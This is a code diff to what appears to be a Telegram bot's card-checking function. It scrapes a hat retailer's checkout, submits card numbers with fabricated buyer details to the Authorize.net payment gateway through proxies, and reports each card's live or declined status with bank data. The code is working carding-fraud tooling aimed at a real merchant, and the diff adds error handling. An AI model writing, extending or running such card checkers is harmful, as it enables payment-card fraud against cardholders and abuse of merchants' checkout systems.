@@ -85,7 +85,7 @@ async def get_live(card, msg):
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-    initial_time = time.perf_counter()
+    initial_time = time.time()
 
     headers = {
         'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -297,144 +297,142 @@ async def get_live(card, msg):
 }
 
     response = session.get('https://millerhats.com/store/index.php?route=checkout/confirm', headers=headers, proxies=proxy)
-    getIndex(response)
-    price = getStr(response.text,
+    try:
+        price = getStr(response.text,
                """ <td colspan="4" class="text-right"><strong>Total:</strong></td>
         <td class="text-right">$""",
                '</td>'
                )
 
-    login = getStr(response.text, 'x_login" value="', '" />')
-    hash_ = getStr(response.text, 'x_fp_hash" value="', '" />')
-    invoice = getStr(response.text, 'invoice_num" value="', '" />')
-    time_stamp = getStr(response.text, 'x_fp_timestamp" value="', '" />')
-    fp = getStr(response.text, 'x_fp_sequence" value="', '" />')
+        login = getStr(response.text, 'x_login" value="', '" />')
+        hash_ = getStr(response.text, 'x_fp_hash" value="', '" />')
+        invoice = getStr(response.text, 'invoice_num" value="', '" />')
+        time_stamp = getStr(response.text, 'x_fp_timestamp" value="', '" />')
+        fp = getStr(response.text, 'x_fp_sequence" value="', '" />')
 
-    #await msg.edit_text("7", parse_mode=ParseMode.MARKDOWN)
-
-#  ========= Eight req ========
+        #  ========= Eight req ========
 
 
-    data = {
-        'x_version': '3.0',
-        'x_method': 'CC',
-        'x_login': login,
-        'x_amount': price,
-        'x_currency_code': 'USD',
-        'x_type': 'auth_capture',
-        'x_cust_ID': '0',
-        'x_email_customer': 'FALSE',
-        'x_company': 'New York',
-        'x_first_name': 'Sebastian',
-        'x_last_name': 'Gutierrez',
-        'x_address': '103-105 Central Avenue',
-        'x_city': 'Orange',
-        'x_state': 'NJ',
-        'x_zip': '07050-3824',
-        'x_country': 'United States',
-        'x_phone': '78745834',
-        'x_fax': '',
-        'x_email': email,
-        'x_ship_to_company': 'Quack.Inc',
-        'x_ship_to_first_name': 'Sebastian',
-        'x_ship_to_last_name': 'Gutierrez',
-        'x_ship_to_address': '103-105 Central Avenue',
-        'x_ship_to_city': 'Orange',
-        'x_ship_to_state': 'NJ',
-        'x_ship_to_zip': '07050-3824',
-        'x_ship_to_country': 'United States',
-        'x_Customer_IP': proxy['http'],
-        'x_invoice_num': invoice,
-        'x_description': 'Online purchase from Miller Hats',
-        'x_duplicate_window': '120',
-        'x_relay_response': 'TRUE',
-        'x_relay_always': 'FALSE',
-        'x_relay_url': 'https://millerhats.com/store/authnetsim_callback.php',
-        'x_show_form': 'PAYMENT_FORM',
-        'x_cancel_url': 'https://millerhats.com/store/index.php?route=payment/authnetsim/cancel',
-        'x_cancel_url_text': 'Cancel and Return',
-        'x_receipt_link_method': 'POST',
-        'x_receipt_link_text': '- YOU MUST CLICK HERE TO COMPLETE THE ORDER! - ',
-        'x_receipt_link_url': 'https://millerhats.com/store/index.php?route=payment/authnetsim/success',
-        'x_logo_url': 'http://www.millerhats.com/images/Miller-Header-32.png',
-        'x_fp_sequence': fp,
-        'x_fp_timestamp': time_stamp,
-        'x_fp_hash': hash_,
-}
+        data = {
+            'x_version': '3.0',
+            'x_method': 'CC',
+            'x_login': login,
+            'x_amount': price,
+            'x_currency_code': 'USD',
+            'x_type': 'auth_capture',
+            'x_cust_ID': '0',
+            'x_email_customer': 'FALSE',
+            'x_company': 'New York',
+            'x_first_name': 'Sebastian',
+            'x_last_name': 'Gutierrez',
+            'x_address': '103-105 Central Avenue',
+            'x_city': 'Orange',
+            'x_state': 'NJ',
+            'x_zip': '07050-3824',
+            'x_country': 'United States',
+            'x_phone': '78745834',
+            'x_fax': '',
+            'x_email': email,
+            'x_ship_to_company': 'Quack.Inc',
+            'x_ship_to_first_name': 'Sebastian',
+            'x_ship_to_last_name': 'Gutierrez',
+            'x_ship_to_address': '103-105 Central Avenue',
+            'x_ship_to_city': 'Orange',
+            'x_ship_to_state': 'NJ',
+            'x_ship_to_zip': '07050-3824',
+            'x_ship_to_country': 'United States',
+            'x_Customer_IP': proxy['http'],
+            'x_invoice_num': invoice,
+            'x_description': 'Online purchase from Miller Hats',
+            'x_duplicate_window': '120',
+            'x_relay_response': 'TRUE',
+            'x_relay_always': 'FALSE',
+            'x_relay_url': 'https://millerhats.com/store/authnetsim_callback.php',
+            'x_show_form': 'PAYMENT_FORM',
+            'x_cancel_url': 'https://millerhats.com/store/index.php?route=payment/authnetsim/cancel',
+            'x_cancel_url_text': 'Cancel and Return',
+            'x_receipt_link_method': 'POST',
+            'x_receipt_link_text': '- YOU MUST CLICK HERE TO COMPLETE THE ORDER! - ',
+            'x_receipt_link_url': 'https://millerhats.com/store/index.php?route=payment/authnetsim/success',
+            'x_logo_url': 'http://www.millerhats.com/images/Miller-Header-32.png',
+            'x_fp_sequence': fp,
+            'x_fp_timestamp': time_stamp,
+            'x_fp_hash': hash_,
+    }
 
-    response = session.post('https://secure.authorize.net/gateway/transact.dll', headers=headers, data=data, proxies=proxy)
+        response = session.post('https://secure.authorize.net/gateway/transact.dll', headers=headers, data=data, proxies=proxy)
 
-    #await msg.edit_text("8", parse_mode=ParseMode.MARKDOWN)
+        #await msg.edit_text("8", parse_mode=ParseMode.MARKDOWN)
 
-# ======================== PAYING =========
+    # ======================== PAYING =========
 
-    headers = {
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'Accept-Language': 'es-AR,es;q=0.9',
-        'Cache-Control': 'max-age=0',
-        'Connection': 'keep-alive',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Origin': 'https://secure.authorize.net',
-        'Referer': 'https://secure.authorize.net/gateway/transact.dll',
-        'Upgrade-Insecure-Requests': '1',
-}
+        headers = {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'es-AR,es;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://secure.authorize.net',
+            'Referer': 'https://secure.authorize.net/gateway/transact.dll',
+            'Upgrade-Insecure-Requests': '1',
+    }
 
-    data = {
-        'x_show_form': 'pf_receipt',
-        'x_version': '3.0',
-        'x_method': 'CC',
-        'x_login': login,
-        'x_amount': price,
-        'x_currency_code': 'USD',
-        'x_type': 'auth_capture',
-        'x_cust_ID': '0',
-        'x_email_customer': 'FALSE',
-        'x_Customer_IP': proxy['http'],
-        'x_invoice_num': invoice,
-        'x_description': 'Online purchase from Miller Hats',
-        'x_duplicate_window': '120',
-        'x_relay_response': 'TRUE',
-        'x_relay_always': 'FALSE',
-        'x_relay_url': 'https://millerhats.com/store/authnetsim_callback.php',
-        'x_cancel_url': 'https://millerhats.com/store/index.php?route=payment/authnetsim/cancel',
-        'x_cancel_url_text': 'Cancel and Return',
-        'x_receipt_link_method': 'POST',
-        'x_receipt_link_text': '- YOU MUST CLICK HERE TO COMPLETE THE ORDER! -',
-        'x_receipt_link_url': 'https://millerhats.com/store/index.php?route=payment/authnetsim/success',
-        'x_logo_url': 'http://www.millerhats.com/images/Miller-Header-32.png',
-        'x_fp_sequence': fp,
-        'x_fp_timestamp': time_stamp,
-        'x_fp_hash': hash_,
-        'x_card_num': ccn,
-        'x_exp_date': month+year,
-        'x_first_name': 'Sebastian',
-        'x_last_name': 'Gutierrez',
-        'x_company': 'Quack.Inc',
-        'x_address': '103-105 Central Avenue',
-        'x_city': 'Orange',
-        'x_state': 'NJ',
-        'x_zip': '07050-3824',
-        'x_country': 'United States',
-        'x_email': email,
-        'x_phone': '78745834',
-        'x_fax': '',
-        'x_ship_to_first_name': 'Sebastian',
-        'x_ship_to_last_name': 'Gutierrez',
-        'x_ship_to_company': 'Quack.Inc',
-        'x_ship_to_address': '07050-3824',
-        'x_ship_to_city': 'Orange',
-        'x_ship_to_state': 'NJ',
-        'x_ship_to_zip': '07050-3824',
-        'x_ship_to_country': 'United States',
-}
+        data = {
+            'x_show_form': 'pf_receipt',
+            'x_version': '3.0',
+            'x_method': 'CC',
+            'x_login': login,
+            'x_amount': price,
+            'x_currency_code': 'USD',
+            'x_type': 'auth_capture',
+            'x_cust_ID': '0',
+            'x_email_customer': 'FALSE',
+            'x_Customer_IP': proxy['http'],
+            'x_invoice_num': invoice,
+            'x_description': 'Online purchase from Miller Hats',
+            'x_duplicate_window': '120',
+            'x_relay_response': 'TRUE',
+            'x_relay_always': 'FALSE',
+            'x_relay_url': 'https://millerhats.com/store/authnetsim_callback.php',
+            'x_cancel_url': 'https://millerhats.com/store/index.php?route=payment/authnetsim/cancel',
+            'x_cancel_url_text': 'Cancel and Return',
+            'x_receipt_link_method': 'POST',
+            'x_receipt_link_text': '- YOU MUST CLICK HERE TO COMPLETE THE ORDER! -',
+            'x_receipt_link_url': 'https://millerhats.com/store/index.php?route=payment/authnetsim/success',
+            'x_logo_url': 'http://www.millerhats.com/images/Miller-Header-32.png',
+            'x_fp_sequence': fp,
+            'x_fp_timestamp': time_stamp,
+            'x_fp_hash': hash_,
+            'x_card_num': ccn,
+            'x_exp_date': month+year,
+            'x_first_name': 'Sebastian',
+            'x_last_name': 'Gutierrez',
+            'x_company': 'Quack.Inc',
+            'x_address': '103-105 Central Avenue',
+            'x_city': 'Orange',
+            'x_state': 'NJ',
+            'x_zip': '07050-3824',
+            'x_country': 'United States',
+            'x_email': email,
+            'x_phone': '78745834',
+            'x_fax': '',
+            'x_ship_to_first_name': 'Sebastian',
+            'x_ship_to_last_name': 'Gutierrez',
+            'x_ship_to_company': 'Quack.Inc',
+            'x_ship_to_address': '07050-3824',
+            'x_ship_to_city': 'Orange',
+            'x_ship_to_state': 'NJ',
+            'x_ship_to_zip': '07050-3824',
+            'x_ship_to_country': 'United States',
+    }
 
-    response = session.post('https://secure.authorize.net/gateway/transact.dll', headers=headers, data=data, proxies=proxy)
-    card_response = getStr(response.text, '_response_reason_text=', '&x_avs_code').replace("+", ' ').replace("%21", ' ')
-    final_time = time.perf_counter() - initial_time
-    BIN = card[0:6]
-    data = r.get(BIN_API+BIN).json()
-    
-    mssg = f"""<b>#Authorize_AVS ($au) 🌩️</b>
+        response = session.post('https://secure.authorize.net/gateway/transact.dll', headers=headers, data=data, proxies=proxy)
+        card_response = getStr(response.text, '_response_reason_text=', '&x_avs_code').replace("+", ' ').replace("%21", ' ')
+        final_time = time.perf_counter() - initial_time
+        BIN = card[0:6]
+        data = r.get(BIN_API+BIN).json()
+        
+        mssg = f"""<b>#Authorize_AVS ($au) 🌩️</b>
 ━━━━━━━━━━━
 <a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
 <a href="https://t.me/ByDog3r">↯</a> <b>Status:<b> 
@@ -447,7 +445,26 @@ async def get_live(card, msg):
 <a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
 <a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
 <a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}""" # to check proxy add <a href="https://t.me/ByDog3r">⊁</a> <b>Proxy</b> :{proxy['http']} ✅
-    
-    await msg.edit_text(mssg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
-    session.cookies.clear()
-    session.close()
+        
+        await msg.edit_text(mssg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
+        session.cookies.clear()
+        session.close()
+
+
+    except:
+        final_time = time.time() - initial_time
+        data = r.get(BIN_API+BIN).json()
+        msgg = f"""<b>#Authorize_AVS ($au) 🌩️</b>
+━━━━━━━━━━━
+<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
+<a href="https://t.me/ByDog3r">↯</a> <b>Status: DECLINED! ❌<b> 
+<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> There is an error with the website, try again.
+<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
+━━━━━━━━━━━
+<code>| Bank Information</code>
+━━━━━━━━━━━
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
+<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
+        await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
